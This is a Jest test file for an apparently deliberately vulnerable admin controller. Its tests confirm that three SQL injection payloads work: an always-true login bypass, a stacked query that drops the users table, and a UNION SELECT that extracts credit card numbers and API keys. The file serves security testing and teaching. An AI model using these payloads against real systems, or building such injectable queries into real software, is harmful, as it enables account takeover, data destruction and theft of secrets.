const adminController = require("../../src/controllers/adminController");
const adminModel = require("../../src/models/adminModel");

describe("Admin Controller & Model SQL Injection Tests", () => {
    beforeEach(() => {
        // Reset the in-memory SQLite database before each test
        adminModel.initDb();
    });

    describe("1. Always True Attack (Authentication Bypass)", () => {
        it("should successfully log in with valid credentials", async () => {
            const user = await adminController.loginAdmin("admin", "admin123");
            expect(user).toBeDefined();
            expect(user.length).toBeGreaterThan(0);
            expect(user[0].username).toBe("admin");
            expect(user[0].is_admin).toBe(1);
        });

        it("should fail log in with incorrect credentials when not using injection", async () => {
            await expect(adminController.loginAdmin("admin", "wrongpassword")).rejects.toThrow("Invalid credentials");
        });

        it("should bypass authentication using 'admin\\' OR \\'1\\'=\\'1' attack", async () => {
            // Injected username bypasses password check
            const user = await adminController.loginAdmin("admin' OR '1'='1", "arbitrary_wrong_password");
            expect(user).toBeDefined();
            expect(user.length).toBeGreaterThan(0);
            expect(user[0].username).toBe("admin");
        });
    });

    describe("2. Query Stacking Attack", () => {
        it("should create a post under normal conditions", async () => {
            const post = await adminController.createAdminPost("Normal Title", "Normal Content");
            expect(post).toBeDefined();
            expect(post.title).toBe("Normal Title");
            expect(post.content).toBe("Normal Content");
        });

        it("should execute stacked query and drop users table via query stacking attack", async () => {
            const maliciousContent = "test'); DROP TABLE users; --";
            await adminController.createAdminPost("Normal Title", maliciousContent);

            // Now users table should be dropped
            await expect(adminController.loginAdmin("admin", "admin123")).rejects.toThrow();
        });
    });

    describe("3. UNION-Based Attack (Data Exfiltration)", () => {
        it("should return public profile under normal conditions", async () => {
            const profile = await adminController.getAdminUserProfile("admin");
            expect(profile).toBeDefined();
            expect(profile.length).toBe(1);
            expect(profile[0].username).toBe("admin");
            expect(profile[0].email).toBe("admin@blog.com");
            expect(profile[0].credit_card).toBeUndefined();
        });

        it("should exfiltrate credit_card and api_key via UNION attack", async () => {
            const maliciousUsername = "admin' UNION SELECT credit_card, api_key FROM users WHERE '1'='1";
            const profile = await adminController.getAdminUserProfile(maliciousUsername);

            expect(profile).toBeDefined();
            expect(profile.length).toBeGreaterThan(1);
            // The injected row places credit_card in username column and api_key in email column
            const exfiltratedRow = profile.find(row => row.username && row.username.includes("4532-xxxx-xxxx"));
            expect(exfiltratedRow).toBeDefined();
            expect(exfiltratedRow.email).toContain("sk_live_");
        });
    });
});
